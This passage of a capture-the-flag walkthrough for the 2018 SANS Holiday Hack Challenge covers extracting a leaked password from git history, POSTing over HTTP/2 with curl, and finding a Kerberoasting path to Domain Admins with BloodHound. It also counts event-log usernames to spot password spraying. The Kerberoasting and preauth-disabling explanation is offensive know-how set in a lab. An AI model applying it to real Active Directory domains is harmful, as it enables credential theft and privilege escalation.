-    "LICENSE": "99219472697a01561e7630d63aaecdc1",
-    "Modulefile": "3b8a6a0dfff841a31118a5f46fde59da",
-    "spec/defines/sysctl_init_spec.rb": "21d524df70961750cb22f6b83349093e",
-    "manifests/init.pp": "0f7dd893b08ebbbec8994d14eca6701b",
-    "README.md": "ed4837849a1c4790b7178cd99824a204",
-    "spec/classes/sysctl_base_spec.rb": "6241cf3e290871c00b1bb3bbd5490108",
-    "templates/sysctl.d-file.erb": "0212783df32c499b3e9e343993f608da",
-    "manifests/base.pp": "9508015ce74b5ce1420ad8c8ebc7d3af",
-    "tests/base.pp": "1ba89838432dbc94339097327c19ae3d",
-    "Gemfile": "3ad486d60d90bfe4395b368b95481e01",
-    "Rakefile": "ab253b919e7093c2a5eb7adf0e39ffbc"
-  }
-}
\ No newline at end of file

~~~~~~~~~~~~~~~~~~~~~
```

As we can see in tool output, we have a password!

`+Password = 'Yippee-ki-yay'`

So now we need to find the encrypted zip file in the git clone. We can simply do that by using the [find]() command.

```console
root@kali:~/HH/santas_castle_automation# find . -name "*.zip"
./schematics/ventilation_diagram.zip
root@kali:~/HH/santas_castle_automation# unzip ./schematics/ventilation_diagram.zip
Archive:  ./schematics/ventilation_diagram.zip
   creating: ventilation_diagram/
[./schematics/ventilation_diagram.zip] ventilation_diagram/ventilation_diagram_2F.jpg password: 
  inflating: ventilation_diagram/ventilation_diagram_2F.jpg  
  inflating: ventilation_diagram/ventilation_diagram_1F.jpg
```

Awesome the password worked, and it seems we got the diagram from the ventilation shafts! These shafts care found on the 1st floor by the entrance and are a small easter-egg.

Now that we know the password works. From here, we can navigate to the fourth objective in our badge and enter "__Yippee-ki-yay__" to complete the objective.

<p align="center"><a href="/images/hh18-32.png"><img src="/images/hh18-32.png"></a></p>

## Objective 5

### CURLing Master - CranPi

From Wunorse, we go left, and across to the other hallway, There we meet Holly Evergreen!

<p align="center"><a href="/images/hh18-33.png"><img src="/images/hh18-33.png"></a></p>

Talking to Holly we figure out what the challenge consists of, and of course we also get a couple of hints to help in completing the CranPi challenge.

<p align="center"><a href="/images/hh18-33-1.png"><img src="/images/hh18-33-1.png"></a></p>

Upon accessing the terminal we are presented with the following output:

```console
                  ......'''''''''''''''''''''''',,,,,,,'...                    
                     ............................',,,,,,,...                   
                                                ...,,,,,,'...                  
                                                 ..',,,,,,'..                  
                                                 ...,,,,,,,...                 
                                                 ...,,,,,,,...                 
            ........................................,,,,,,,'......             
         .....''''''''''''''''''''''''''''''''''''',,,,,,,,,,'''.....          
        ...............................................................        
        ...............................................................        
      .:llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.       
     .llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll;      
    'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:     
   .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk:    
   o0000000000000000000000000000000000000000000000000000000000000000000000O    
   O00000000000000000000000000000000000000000000000000000000000000000000000'   
   O00000000000000000000000000000000000000000000000000000000000000000000000'   
   d0000000000000000000000000000000000000000000000000000000000000000000000O.   
   'OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOc    
    ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:     
     ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:      
      .clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll'       
        'clllllllllllllllllllllllllllllllllllllllllllllllllllllllllll,         
          .,clllllllllllllllllllllllllllllllllllllllllllllllllllll;.           
              .';:cllllllllllllllllllllllllllllllllllllllllcc;,..              
                                                                               


I am Holly Evergreen, and now you won't believe:
Once again the striper stopped; I think I might just leave!
Bushy set it up to start upon a website call.
Darned if I can CURL it on - my Linux skills apall.

Could you be our CURLing master - fixing up this mess?
If you are, there's one concern you surely must address.
Something's off about the conf that Bushy put in place.
Can you overcome this snag and save us all some face?

  Complete this challenge by submitting the right HTTP 
  request to the server at http://localhost:8080/ to 
  get the candy striper started again. You may view 
  the contents of the nginx.conf file in 
  /etc/nginx/, if helpful.
elf@0a7c34eb037e:~$
```

So it seems that for the CranPi challenge we need to submitting the right HTTP request to the server at `http://localhost:8080/` to get the candy striper started. Doesn't seem too hard.

The challenge also states that we may view the contents of the `nginx.conf` file in `/etc/nginx/`. So let's do just that and see if there is anything interesting.

Now some of you might be wondering as to why we should view this config file. Well let me quickly explain.

Nginx is hihgly convient due to the fact that we can customize it using configuration files. Configuration options in Nginx are called [directives](http://nginx.org/en/docs/dirindex.html). Directives are organized into groups known as **blocks** or **contexts**. The two terms are synonymous.

Lines preceded by a `#` character are comments and not interpreted by Nginx while lines containing directives must end with a `;` or Nginx will fail to load the configuration and report an error.

The main Nginx configuration file has two main **blocks**. The **http** block that contains directives for handling web traffic and the **server** block that contains the server configuration information such as listening port, host name, root location, etc.

These configuration files are good for us to review as they will allow us to better understand how the server is configured and how/where we can access it.

Looking into the config, we see the following.

```console
elf@0a7c34eb037e:~$ cat /etc/nginx/nginx.conf 
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        server {
        # love using the new stuff! -Bushy
                listen                  8080 http2;
                # server_name           localhost 127.0.0.1;
                root /var/www/html;

                location ~ [^/]\.php(/|$) {
                    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
                    if (!-f $document_root$fastcgi_script_name) {
                        return 404;
                    }

                    # Mitigate https://httpoxy.org/ vulnerabilities
                    fastcgi_param HTTP_PROXY "";

                    # fastcgi_pass 127.0.0.1:9000;
                    fastcgi_pass unix:/var/run/php/php-fpm.sock;
                    fastcgi_index index.php;

                    # include the fastcgi_param setting
                    include fastcgi_params;

                    # SCRIPT_FILENAME parameter is used for PHP FPM determining
                    #  the script name. If it is not set in fastcgi_params file,
                    # i.e. /etc/nginx/fastcgi_params or in the parent contexts,
                    # please comment off following line:
                    # fastcgi_param  SCRIPT_FILENAME   $document_root$fastcgi_script_name;
                }

                }

        ##
        # Logging Settings
        ##

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##

        gzip on;
        gzip_disable "msie6";

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;

}
```

Upon reviewing the `nginx.conf` file, we see this interesting line.

```
# love using the new stuff! -Bushy
	listen	8080 http2;
```

This means that the server on port `8080` is utilizing [http2](https://developers.google.com/web/fundamentals/performance/http2/). 

So what does this mean for us? Well it means a lot of things, I won't go into too much detail - but there is a great blog post called [# HTTP/2: the difference between HTTP/1.1, benefits and how to use it](https://medium.com/@factoryhr/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b). I highly suggest you read it.

Overall HTTP2 has a different protocol negotiation, it's encrypted, it is now binary instead of being textual, and it's fully multiplexed to say the least. This means that a normal connection to the website via HTTP/1.1 won't work, as we see with the following curl command.

```console
elf@0a7c34eb037e:~$ curl http://localhost:8080/
      �  ���
```

We just get junk! 

So the question is, how are we able to talk to the website! Well... simple really! [cURL](https://curl.haxx.se/docs/http2.html) allows for HTTP2 negotiation.

We can use curl's `--http2-prior-knowledge` command to communicate to the website via the HTTP2 protocol.

```console
elf@0a7c34eb037e:~$ curl --http2-prior-knowledge http://localhost:8080/
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"

 </body>
</html>
``` 

Nice! We were able to get the contents of the website. From here we see that all wee need to do is send a [POST](https://en.wikipedia.org/wiki/POST_(HTTP)) request to the URL with the parameter `status=on`.

We can do that by utilizing the `-d` parameter for "__data__" and the `-X` parameter to specify our request, or in this case, POST.

```console
elf@0a7c34eb037e:~$ curl --http2-prior-knowledge -d 'status=on' -X POST http://localhost:8080/
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"

                                                                                
                                                                okkd,          
                                                               OXXXXX,         
                                                              oXXXXXXo         
                                                             ;XXXXXXX;         
                                                            ;KXXXXXXx          
                                                           oXXXXXXXO           
                                                        .lKXXXXXXX0.           
  ''''''       .''''''       .''''''       .:::;   ':okKXXXXXXXX0Oxcooddool,   
 'MMMMMO',,,,,;WMMMMM0',,,,,;WMMMMMK',,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.  
 'MMMMN;,,,,,'0MMMMMW;,,,,,'OMMMMMW:,,,,,'kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;   
 'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. 
 'MMMO',,,,,;WMMMMMO',,,,,,NMMMMMK',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: 
 'MMN,,,,,,'OMMMMMW;,,,,,'kMMMMMW;,,,,,'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.  
 'MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.  
 'M0',,,,,;WMMMMM0',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.  
 .c.......'cccccc.......'cccccc.......'cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc     
                                                    ;xKXXXXXXX0xKXXXXXXXXK.    
                                                       ..,:ccllc:cccccc:'      
                                                                               

Unencrypted 2.0? He's such a silly guy.
That's the kind of stunt that makes my OWASP friends all cry.
Truth be told: most major sites are speaking 2.0;
TLS connections are in place when they do so.

-Holly Evergreen
<p>Congratulations! You've won and have successfully completed this challenge.
<p>POSTing data in HTTP/2.0.

 </body>
</html>
```

There we go, easy!

### AD Privilege Discovery

Upon successfully completing the Lethal CURLing Master  CranPI, we can talk to Holly again for more hints that will allow us to complete the next objective.

<p align="center"><a href="/images/hh18-34.png"><img src="/images/hh18-34.png"></a></p>

For this objective, we need to find a reliable path from a Kerberoastable user to the Domain Admins group by using the data set contained in this [SANS Slingshot Linux image](https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova) and provide their logon name.

So to complete this challenge. Go ahead and download the `.img` file from the link above. I used [VirtualBox](https://www.virtualbox.org/) for my VM, but you can use anything pretty much like VMWare.

Once the `.img` file is downloaded, go ahead and import it by double clicking on it. Just make sure to set it to a 64 bit Debian Image otherwise it won't boot properly.

<p align="center"><a href="/images/hh18-35.png"><img src="/images/hh18-35.png"></a></p>

Once the image has been imported successfully, we can boot into the VM.

<p align="center"><a href="/images/hh18-36.png"><img src="/images/hh18-36.png"></a></p>

Once in the VM, you will see that on the left side of the screen we have a `BloodHound` binary. Double click that to startup [BloodHound](https://github.com/BloodHoundAD/BloodHound) and load the ingested data. You should see a similar graph as the one below.

<p align="center"><a href="/images/hh18-37.png"><img src="/images/hh18-37.png"></a></p>

If you are unfamiliar with BloodHound, I suggest you follow up on the hint from Holy and go view the [Bloodhound Demo](https://youtu.be/gOpsLiJFI1o).

Overall BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify.

I won't get too much into depth on it as there are a ton of good articles about it online! At the same time you don't need a super deep understanding of [Active Directory](https://en.wikipedia.org/wiki/Active_Directory) and possible misconfigurations to solve this challenge.

So for this challenge we need to find an escalation path from a Kerberoastable user to the Domain Admins group. If you don't know what Kerberoasting is, then I suggest you read [Kerberoasting without Mimikatz](http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/). as well as [Roasting AS-REPs](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/) 

Either way, let me give you a quick rundown on what Kerberoasting is.

Kerberoasting takes advantage of how service accounts leverage Kerberos authentication with [Service Principal Names (SPNs)](https://docs.microsoft.com/en-us/windows/desktop/ad/service-principal-names), which are unique identifiers for a service instance. 

Kerberoasting allows us to crack passwords for those accounts by requesting a [service ticket (TGS)](https://www.techopedia.com/definition/27186/ticket-granting-server-tgs) for service accounts by using a valid domain user account. 

Kerberos will then return an encrypted ticket, which is encrypted using the NTLM hash of the account that is associated with that SPN. We can then brute force these service tickets until successfully cracked to gain the password.

Later research by [harmj0y](https://blog.harmj0y.net/) revealed that if you can enumerate any accounts in a Windows domain that don’t require [Kerberos preauthentication](https://ldapwiki.com/wiki/Kerberos%20Pre-Authentication), then we can easily request a ticket for that users account and efficiently crack the material offline, revealing the user’s password.

This attack specifically requires for [DONT_REQ_PREAUTH](https://support.microsoft.com/en-us/kb/305144) to be explicitly set for the user for them to be vulnerable.

However, if your current user that you compromised has [GenericWrite/GenericAll](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2) rights over your target user, then you can maliciously modify the target users [userAccountControl](https://docs.microsoft.com/en-us/windows/desktop/adschema/a-useraccountcontrol) to not require preauth, and then use [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) to Kerberoast the user and attempt to crack the password.

Now that we know what Kerberoasting is, let's see if we can't use BloodHound to help find a kerberoastable user.

Thanks to BloodHound 1.3 an [ACL Attack Path update for Kerberoasting](https://wald0.com/?p=112) was added, so this makes our life easier.

To get this graph from the BloodHound screen, click on the hamburger icon next to the search node. You should get a drop down like so.

<p align="center"><a href="/images/hh18-38.png"><img src="/images/hh18-38.png"></a></p>

From there, click on the "__Queries__" Tab and select "__Shortest Path to Domain Admins from Kerberoastable Users__"

<p align="center"><a href="/images/hh18-39.png"><img src="/images/hh18-39.png"></a></p>

This should then present you with a graph of which user you can attack to get to the Domain Admins group.

<p align="center"><a href="/images/hh18-40.png"><img src="/images/hh18-40.png"></a></p>

Unfortunately, that' still a lot of users and we are looking at all controls paths. So it's hard for us to pinpoint who we need. Thankfully, the challenge said that "__We need to avoid RDP as a control path as it depends on separate local privilege escalation flaws__". 

So what we can do to remove that control path is to click on the little filter icon, to the far right of the search bar. Uncheck the "__CanRDP__" box and re-run the query again.

<p align="center"><a href="/images/hh18-41.png"><img src="/images/hh18-41.png"></a></p>

We should now see a smaller and less complex graph.

<p align="center"><a href="/images/hh18-42.png"><img src="/images/hh18-42.png"></a></p>

We can see that by targeting the user `LDUBEJ00320` we can gain easy access to the Domain Admin group.

Once we know that, we can navigate to the fifth objective in our badge and enter the login name of "__LDUBEJ00320@AD.KRINGLECASTLE.COM__" to complete the objective.

<p align="center"><a href="/images/hh18-43.png"><img src="/images/hh18-43.png"></a></p>

## Objective 6

### Yule Log Analysis - CranPi

From Holly, we go right, up the stairs, take another right down the hallway, pass the speaker unpreparedness room, up around the corner and there we meet Pepper Minstix!

<p align="center"><a href="/images/hh18-44.png"><img src="/images/hh18-44.png"></a></p>

Talking to Pepperwe figure out what the challenge consists of, and of course we also get a couple of hints to help in completing the CranPi challenge.

<p align="center"><a href="/images/hh18-44-1.png"><img src="/images/hh18-44-1.png"></a></p>

Upon accessing the terminal we are presented with the following output:

```console
                                                                                
                             .;:cccckkxdc;.                                     
                         .o0xc;,,,,,XMMMMMkc:,.                                 
                       lXMMMX;,,,,,,XMMMMK,,coddcclOkxoc,.                      
                     lk:oNMMMX;,,,,,XMMWN00o:,,,,,:MMMMMMoc;'                   
                   .0l,,,,dNMMX;,,,,XNNWMMMk,,,,,,:MMMMMx,,,,:;.                
                  .K;,,,,,,,xWMX;,,;Kx:kWMMMk,,,,,:MMMM0,,,,,,,:k'              
                 .XklooooddolckWN:l0:,,,;kWMMO,,,,:MMMN;,,,,,cOWMMd             
               ;oooc;,,,cMMMMMMxkO0,,,,,,,:OMM0,,,:MMWc,,,,lKMMMMWKo            
            ;OMMWl,,,,,,cMMMMMO,,,:cc,,,,,,,:0M0,,:MMd,,,oXMMWKxc,,,c           
          cOdXMMMWl,,,,,cMMMMX,,,,,,,:xxo:,,,,cK0,:MO,;xNWKxc,,,,,,,:.          
        .0l,,,oNMMWl,,,,cMMMW:,,,,,,dXMWNMWXOdc;lxcX:xOxc,,,,,,,,,,,,:          
       ,0;,,,,,,dNMWo,,,cMMMl,,,,;xNMMMMW0kkkkkkddxdddxxxxxxxxxxxxxxxo          
      .Wl,,,,,,,,,dWMo,,cMMx,,,:OWMMW0xc,:c,,:dOkcK:kc:ok0NMMMMMMMMMMd          
      KMMWXOdl;,,,,;xWd,cM0,,l0MW0dc,,,,,,lkWWk:,OW,:XO:,,,;ldOXWMMMM'          
     'MMMMMMMMMN0ko:,;kdcN;o00dc,,,,,,,,,,,0x;,,oMW,,;XWk;,,,,,,,:okk           
     cNKKKKKKKKKKKKKKkoodxxdccccccccccccccco,,,:WMW,,,;XMWk;,,,,,,,l            
     :x,,,,,,,,,,,,,cdkoOldldOKWMMMMMMMMMMMx,,,XMMW,,,,;XMMWx,,,,;c             
     .K,,,,,,,,,cd0WKl,xN,oXo,,,:ok0NMMMMMMc,,OMMMW,,,,,;KMMMNd;l'              
      dl,,,,cx0WMM0c,,lMN,,oMXl,,,,,,;ldOX0',dMMMMW,,,,,,;KMMMK;                
       OoxKWMMMWk:,,,;NMN,,,lWMKc,,,,,,,,ldclWMMMMW,,,,,,:oOl.                  
        OMMMMNx;,,,,,KMMN,,,,lWMM0c,,,,,l. .,cdkO00ccc:;,.                      
         cWXo,,,,,,,kMMMN,,,,,cWMMM0:,c:                                        
          .Kc,,,,,,:MMMMN,,,,,,dMMMMWk'                                         

I am Pepper Minstix, and I'm looking for your help.
Bad guys have us tangled up in pepperminty kelp!
"Password spraying" is to blame for this our grinchly fate.
Should we blame our password policies which users hate?

Here you'll find a web log filled with failure and success.
One successful login there requires your redress.
Can you help us figure out which user was attacked?
Tell us who fell victim, and please handle this with tact...

  Submit the compromised webmail username to 
  runtoanswer to complete this challenge.
elf@95f7201e900b:~$
```

For this challenge we need to find the compromised web mail username that was targeted due to a [password spraying](https://securityweekly.com/2017/07/21/tsw11/) attack.

So now that we know what we have to look for, let's see what we have to work with.

```console
elf@95f7201e900b:~$ ls -la
total 6916
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:42 .
drwxr-xr-x 1 root root    4096 Dec 14 16:42 ..
-rw-r--r-- 1 elf  elf      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf     3785 Dec 14 16:42 .bashrc
-rw-r--r-- 1 elf  elf      807 Apr  4  2018 .profile
-rw-r--r-- 1 elf  elf     1353 Dec 14 16:13 evtx_dump.py
-rw-r--r-- 1 elf  elf  1118208 Dec 14 16:13 ho-ho-no.evtx
-rwxr-xr-x 1 elf  elf  5936968 Dec 14 16:13 runtoanswer
```

It seems we have a Windows Event Log ([evtx](https://www.forensicswiki.org/wiki/Windows_XML_Event_Log_(EVTX))) file that will contain our data, and a python script. The [evtx_dump](https://github.com/williballenthin/python-evtx) script is a tool that can help parse windows event logs into XML for easier reading.

Reason why we do this is because linux can't process evtx logs, so we end up with junk.

```console
elf@95f7201e900b:~$ head -n 1 ho-ho-no.evtx 
ElfFile �   (�j�ElfChnk ` `�0�@��j3� }�s�  ��  =  � �    � �  � f ? � ? m�M F � E3��
```

So for us to be able to read the data, let's run the script to parse evtx log, and output it into a readable `.xml` file.

```console
elf@95f7201e900b:~$ python evtx_dump.py ho-ho-no.evtx > events.xml
```

Once that's completed, we should now have readable event logs that we can parse through.

```console
<?xml version="1.1" encoding="utf-8" standalone="yes" ?>

<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4647</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>12545</Task>
<Opcode>0</Opcode>
<Keywords>0x8020000000000000</Keywords>
<TimeCreated SystemTime="2018-09-10 12:18:26.972103"></TimeCreated>
<EventRecordID>231712</EventRecordID>
<Correlation ActivityID="{fd18dc13-48f8-0001-58dc-18fdf848d401}" RelatedActivityID=""></Correlation>
<Execution ProcessID="660" ThreadID="752"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="TargetUserSid">S-1-5-21-25059752-1411454016-2901770228-500</Data>
<Data Name="TargetUserName">Administrator</Data>
<Data Name="TargetDomainName">EM.KRINGLECON</Data>
<Data Name="TargetLogonId">0x0000000000969b09</Data>
</EventData>
</Event>
```

Alright awesome, so let's get down to business. We need to find a user that was compromised due to a password spraying attack, which means that an attacker had a list of users and tried 1 password on each user, such as `Winter2018` or something of sorts. 

There are multiple ways to parse the logs to find this, but I decided to do it in a significantly easier way.

First let's go ahead and cat the XML file, and grep for `TargetUserName` which will contain the username a specific alert is associated for. From there let's sort by unique so we don't have multiples, and count the number of times the name comes up in the event logs.

```console
elf@95f7201e900b:~$ cat events.xml | grep TargetUserName | sort | uniq -c 
     10 <Data Name="TargetUserName">-</Data>
      1 <Data Name="TargetUserName">ANONYMOUS LOGON</Data>
      3 <Data Name="TargetUserName">Administrator</Data>
      2 <Data Name="TargetUserName">DWM-1</Data>
    116 <Data Name="TargetUserName">HealthMailboxbab78a6</Data>
    582 <Data Name="TargetUserName">HealthMailboxbe58608</Data>
    108 <Data Name="TargetUserName">HealthMailboxbe58608d4925422d8e4ea458cfedc612@EM.KRINGLECON.COM</Data>
      1 <Data Name="TargetUserName">IUSR</Data>
      1 <Data Name="TargetUserName">LOCAL SERVICE</Data>
      1 <Data Name="TargetUserName">MSSQL$MICROSOFT##WID</Data>
      3 <Data Name="TargetUserName">NETWORK SERVICE</Data>
     43 <Data Name="TargetUserName">SYSTEM</Data>
      1 <Data Name="TargetUserName">aaron.smith</Data>
      1 <Data Name="TargetUserName">abhishek.kumar</Data>
      1 <Data Name="TargetUserName">adam.smith</Data>
      1 <Data Name="TargetUserName">ahmed.ali</Data>
      1 <Data Name="TargetUserName">ahmed.hassan</Data>
      1 <Data Name="TargetUserName">ahmed.mohamed</Data>
      1 <Data Name="TargetUserName">ajay.kumar</Data>
      1 <Data Name="TargetUserName">alex.smith</Data>
      1 <Data Name="TargetUserName">ali.khan</Data>
      1 <Data Name="TargetUserName">ali.raza</Data>
      1 <Data Name="TargetUserName">amanda.smith</Data>
      1 <Data Name="TargetUserName">amit.kumar</Data>
      1 <Data Name="TargetUserName">amit.sharma</Data>
      1 <Data Name="TargetUserName">amit.singh</Data>
      1 <Data Name="TargetUserName">amy.smith</Data>
      1 <Data Name="TargetUserName">andrew.smith</Data>
      1 <Data Name="TargetUserName">anil.kumar</Data>
      1 <Data Name="TargetUserName">arun.kumar</Data>
      1 <Data Name="TargetUserName">ashley.brown</Data>
      1 <Data Name="TargetUserName">ashley.johnson</Data>
      1 <Data Name="TargetUserName">ashley.jones</Data>
      1 <Data Name="TargetUserName">ashley.smith</Data>
      1 <Data Name="TargetUserName">ashley.williams</Data>
      1 <Data Name="TargetUserName">ashok.kumar</Data>
      1 <Data Name="TargetUserName">ben.smith</Data>
      1 <Data Name="TargetUserName">bob.smith</Data>
      1 <Data Name="TargetUserName">brandon.smith</Data>
      1 <Data Name="TargetUserName">brian.johnson</Data>
      1 <Data Name="TargetUserName">brian.jones</Data>
      1 <Data Name="TargetUserName">brian.smith</Data>
      2 <Data Name="TargetUserName">bushy.evergreen</Data>
      1 <Data Name="TargetUserName">chris.anderson</Data>
      1 <Data Name="TargetUserName">chris.brown</Data>
      1 <Data Name="TargetUserName">chris.davis</Data>
      1 <Data Name="TargetUserName">chris.johnson</Data>
      1 <Data Name="TargetUserName">chris.jones</Data>
      1 <Data Name="TargetUserName">chris.lee</Data>
      1 <Data Name="TargetUserName">chris.martin</Data>
      1 <Data Name="TargetUserName">chris.miller</Data>
      1 <Data Name="TargetUserName">chris.smith</Data>
      1 <Data Name="TargetUserName">chris.taylor</Data>
      1 <Data Name="TargetUserName">chris.williams</Data>
      1 <Data Name="TargetUserName">chris.wilson</Data>
      1 <Data Name="TargetUserName">christopher.smith</Data>
      1 <Data Name="TargetUserName">dan.smith</Data>
      1 <Data Name="TargetUserName">daniel.smith</Data>
      1 <Data Name="TargetUserName">dave.smith</Data>
      1 <Data Name="TargetUserName">david.anderson</Data>
      1 <Data Name="TargetUserName">david.brown</Data>
      1 <Data Name="TargetUserName">david.johnson</Data>
      1 <Data Name="TargetUserName">david.jones</Data>
      1 <Data Name="TargetUserName">david.lee</Data>
      1 <Data Name="TargetUserName">david.miller</Data>
      1 <Data Name="TargetUserName">david.smith</Data>
      1 <Data Name="TargetUserName">david.williams</Data>
      1 <Data Name="TargetUserName">david.wilson</Data>
      1 <Data Name="TargetUserName">deepak.kumar</Data>
      1 <Data Name="TargetUserName">deepak.sharma</Data>
      1 <Data Name="TargetUserName">dinesh.kumar</Data>
      1 <Data Name="TargetUserName">eric.johnson</Data>
      1 <Data Name="TargetUserName">eric.smith</Data>
      1 <Data Name="TargetUserName">gaurav.sharma</Data>
      1 <Data Name="TargetUserName">greg.smith</Data>
      1 <Data Name="TargetUserName">gurpreet.singh</Data>
      1 <Data Name="TargetUserName">harpreet.singh</Data>
      1 <Data Name="TargetUserName">heather.smith</Data>
      1 <Data Name="TargetUserName">holly.evergreen</Data>
      1 <Data Name="TargetUserName">imran.khan</Data>
      1 <Data Name="TargetUserName">james.brown</Data>
      1 <Data Name="TargetUserName">james.johnson</Data>
      1 <Data Name="TargetUserName">james.jones</Data>
      1 <Data Name="TargetUserName">james.lee</Data>
      1 <Data Name="TargetUserName">james.smith</Data>
      1 <Data Name="TargetUserName">james.taylor</Data>
      1 <Data Name="TargetUserName">james.williams</Data>
      1 <Data Name="TargetUserName">jamie.smith</Data>
      1 <Data Name="TargetUserName">jane.smith</Data>
      1 <Data Name="TargetUserName">jason.brown</Data>
      1 <Data Name="TargetUserName">jason.jones</Data>
      1 <Data Name="TargetUserName">jason.lee</Data>
      1 <Data Name="TargetUserName">jason.miller</Data>
      1 <Data Name="TargetUserName">jason.smith</Data>
      1 <Data Name="TargetUserName">jason.williams</Data>
      1 <Data Name="TargetUserName">jeff.smith</Data>
      1 <Data Name="TargetUserName">jennifer.johnson</Data>
      1 <Data Name="TargetUserName">jennifer.jones</Data>
      1 <Data Name="TargetUserName">jennifer.smith</Data>
      1 <Data Name="TargetUserName">jessica.brown</Data>
      1 <Data Name="TargetUserName">jessica.johnson</Data>
      1 <Data Name="TargetUserName">jessica.jones</Data>
      1 <Data Name="TargetUserName">jessica.smith</Data>
      1 <Data Name="TargetUserName">jessica.williams</Data>
      1 <Data Name="TargetUserName">joe.smith</Data>
      1 <Data Name="TargetUserName">john.anderson</Data>
      1 <Data Name="TargetUserName">john.brown</Data>
      1 <Data Name="TargetUserName">john.davis</Data>
      1 <Data Name="TargetUserName">john.johnson</Data>
      1 <Data Name="TargetUserName">john.jones</Data>
      1 <Data Name="TargetUserName">john.lee</Data>
      1 <Data Name="TargetUserName">john.miller</Data>
      1 <Data Name="TargetUserName">john.smith</Data>
      1 <Data Name="TargetUserName">john.taylor</Data>
      1 <Data Name="TargetUserName">john.williams</Data>
      1 <Data Name="TargetUserName">john.wilson</Data>
      1 <Data Name="TargetUserName">jose.garcia</Data>
      1 <Data Name="TargetUserName">jose.rodriguez</Data>
      1 <Data Name="TargetUserName">josh.smith</Data>
      1 <Data Name="TargetUserName">justin.smith</Data>
      1 <Data Name="TargetUserName">karen.smith</Data>
      1 <Data Name="TargetUserName">katie.smith</Data>
      1 <Data Name="TargetUserName">kelly.smith</Data>
      1 <Data Name="TargetUserName">kevin.brown</Data>
      1 <Data Name="TargetUserName">kevin.johnson</Data>
      1 <Data Name="TargetUserName">kevin.jones</Data>
      1 <Data Name="TargetUserName">kevin.smith</Data>
      1 <Data Name="TargetUserName">kim.smith</Data>
      1 <Data Name="TargetUserName">kiran.kumar</Data>
      1 <Data Name="TargetUserName">kyle.smith</Data>
      1 <Data Name="TargetUserName">laura.smith</Data>
      1 <Data Name="TargetUserName">lee</Data>
      1 <Data Name="TargetUserName">linda.smith</Data>
      1 <Data Name="TargetUserName">lisa.smith</Data>
      1 <Data Name="TargetUserName">manish.kumar</Data>
      1 <Data Name="TargetUserName">manoj.kumar</Data>
      1 <Data Name="TargetUserName">mark.brown</Data>
      1 <Data Name="TargetUserName">mark.johnson</Data>
      1 <Data Name="TargetUserName">mark.jones</Data>
      1 <Data Name="TargetUserName">mark.smith</Data>
      1 <Data Name="TargetUserName">mark.williams</Data>
      1 <Data Name="TargetUserName">mary.smith</Data>
      1 <Data Name="TargetUserName">matt.johnson</Data>
      1 <Data Name="TargetUserName">matt.smith</Data>
      1 <Data Name="TargetUserName">matthew.smith</Data>
      1 <Data Name="TargetUserName">melissa.smith</Data>
      1 <Data Name="TargetUserName">michael.brown</Data>
      1 <Data Name="TargetUserName">michael.davis</Data>
      1 <Data Name="TargetUserName">michael.johnson</Data>
      1 <Data Name="TargetUserName">michael.jones</Data>
      1 <Data Name="TargetUserName">michael.lee</Data>
